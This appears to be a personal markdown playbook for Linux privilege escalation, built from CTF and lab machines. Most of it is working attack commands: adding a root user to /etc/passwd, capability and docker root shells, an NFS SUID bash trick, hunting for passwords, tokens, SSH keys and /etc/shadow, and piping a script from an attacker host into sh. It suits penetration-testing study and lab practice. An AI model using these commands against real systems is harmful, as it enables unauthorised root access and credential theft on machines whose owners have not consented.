# Linux Privilege Escalation — Methodology

> My working playbook for going from a low-privileged shell to `root` on Linux.
> Built from notes across dozens of HTB / THM / Proving Grounds machines and
> distilled into the order I *actually* enumerate in — not a copied tutorial.

**The one rule that matters:** work **top → bottom**. The vast majority of roots
come from `sudo -l`, SUID binaries, cron/timers, writable files, or reused
credentials. Kernel exploits are a **last resort**, not a first move — they're
noisy, can panic the box, and are rarely the intended path.

Reference kept open at all times: [GTFOBins](https://gtfobins.github.io) — the
lookup for turning any `sudo`/SUID/capability into a shell.

Related: [Initial Enumeration](./enumeration.md) · [Windows PrivEsc](./windows-privesc.md) · [Active Directory](./active-directory.md)

---

## Phase 0 — Situational awareness (first 2 minutes)

Before running any tooling, I answer three questions by hand: *who am I, what
can I already do, and what kind of host is this?*

```bash
id ; whoami ; sudo -l          # sudo -l is the single most valuable command
uname -a ; cat /etc/os-release
ip a ; ip route ; cat /etc/hosts
env                            # LD_* vars, custom PATH, secrets leak here
```

**What I'm looking for:**
- **Groups** — `docker`, `lxd`, `disk`, `adm`, `sudo`, `wheel` are often an
  instant win on their own (see Phase 5).
- **Account type** — a service account like `www-data` behaves very differently
  from a real user. It tells me whether to hunt web configs or user credentials.
- **Kernel age** — noted now, used only if everything else fails.

**Stabilise the shell first** — a raw reverse shell will bite me later (no tab
completion, `Ctrl-C` kills the session):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # then Ctrl-Z
stty raw -echo; fg
```

---

## Phase 1 — Quick wins

This is where most machines fall. I go through these in order and don't move on
to anything exotic until all five are exhausted.

### 1a — `sudo -l` → GTFOBins
- Any binary I'm allowed to run → look it up on GTFOBins for a `sudo` breakout.
- `env_keep` contains `LD_PRELOAD` / `LD_LIBRARY_PATH` → shared-object injection.
- Check the sudo version (`sudo -V`) for **CVE-2021-3156 (Baron Samedit)** and
  **CVE-2019-14287** (`sudo -u#-1`).

### 1b — SUID / SGID → GTFOBins
```bash
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID
```
For a *custom* SUID binary, I run `strings` / `ltrace` on it — if it calls
another binary without a full path, that's a **PATH hijack**.

### 1c — Capabilities
```bash
getcap -r / 2>/dev/null
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'   # cap_setuid+ep
```

### 1d — Writable `/etc/passwd` → add a root user
```bash
openssl passwd -1 -salt x pass123
echo 'hx:$1$x$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd ; su hx
```

### 1e — Cron jobs **and** systemd timers
```bash
cat /etc/crontab ; ls -la /etc/cron.* /var/spool/cron
systemctl list-timers --all
ls -la /etc/systemd/system/ /lib/systemd/system/   # a writable .service = root
```
The wins here: a writable script run by root, a wildcard injection (e.g. `tar *`),
or a hidden root job. When nothing obvious shows up I run **pspy64** to watch
processes without needing root — it reveals scheduled jobs that don't appear in
crontab.

---

## Phase 2 — Credential hunting

Every credential is a key that might open *this* box or the next host. I hunt
before I assume I need an exploit at all.

```bash
cat ~/.bash_history ~/.*_history 2>/dev/null
grep -rniE 'password|passwd|api_key|secret|token' /var/www /opt /home /etc 2>/dev/null
ls -la ~/.ssh /home/*/.ssh 2>/dev/null        # private keys → reuse to other hosts
cat /var/www/html/**/config* wp-config.php 2>/dev/null   # DB creds
cat /var/mail/* /var/spool/mail/* 2>/dev/null
```

**When I find a password**, I try it everywhere: `su <user>`, SSH, `mysql -u root
-p<PASS>` (which can lead to UDF/`FILE`-based root), writing into another user's
`~/.ssh/authorized_keys`, and any other host on the network. Password reuse is
the most under-used privesc technique.

---

## Phase 3 — Services / internal ports

```bash
ps aux --forest | grep -i root
ss -tulpn                    # services bound to 127.0.0.1
ssh -L 6379:127.0.0.1:6379 <user>@<TARGET_IP>   # forward Redis/DB/internal web out
```

Something listening only on localhost is usually running as root and never meant
to be reached — port-forwarding it to my box turns it into an attack surface.

---

## Phase 4 — Writable files / PATH / library abuse

```bash
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys'
echo $PATH
```

- Writable init / systemd script run by root → inject a payload.
- Writable directory earlier in root's `$PATH` + a relative binary call → **PATH hijack**.
- Writable `.py` / `.sh` that a root script **imports or sources** → library hijack.
- Writable `sudoers.d/` → drop in a `NOPASSWD` line.

---

## Phase 5 — Group-based wins

If Phase 0 showed me a dangerous group, this is often faster than anything else:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh   # docker group
debugfs /dev/sda1                                     # disk group → read /etc/shadow
```
`lxd` / `lxc` → mount the host `/` inside a container. `adm` → read `/var/log`
for leaked credentials.

---

## Phase 6 — NFS (`no_root_squash`)

```bash
cat /etc/exports ; showmount -e <TARGET_IP>
# attacker (as root): mount the share, copy in /bin/bash, chmod +s it
# target: ./rootbash -p
```

---

## Phase 7 — Kernel exploits (last resort)

```bash
uname -a ; searchsploit linux kernel <version>
ls -l /usr/bin/pkexec        # if SUID → CVE-2021-4034 (PwnKit), very common
```

DirtyPipe (kernel 5.8–5.16) and DirtyCow (<4.8.3) live here too. These carry a
real risk of panicking the machine, so they're the **last** thing I reach for,
never the first.

---

## Tooling & file transfer

`linpeas.sh` · `lse.sh` · **`pspy64`** (watch cron without root) · GTFOBins ·
`linux-exploit-suggester.sh`. I always verify what an automated tool flags — a
red linpeas line is a lead, not a conclusion.

```bash
# attacker: python3 -m http.server 80
curl http://<ATTACKER_IP>/linpeas.sh | sh          # run in memory, no file on disk
```

---

## My six golden rules

1. `sudo -l` and SUID **first** — most roots live there.
2. A red linpeas line gets checked **immediately**.
3. Check GTFOBins before dismissing *any* binary.
4. Reuse every credential — `su`, SSH, DB, other hosts.
5. 45 minutes with no progress → rotate to a different vector.
6. Kernel is the last resort, not the opening move.

---

## References

- [GTFOBins](https://gtfobins.github.io)
- [PayloadsAllTheThings — Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
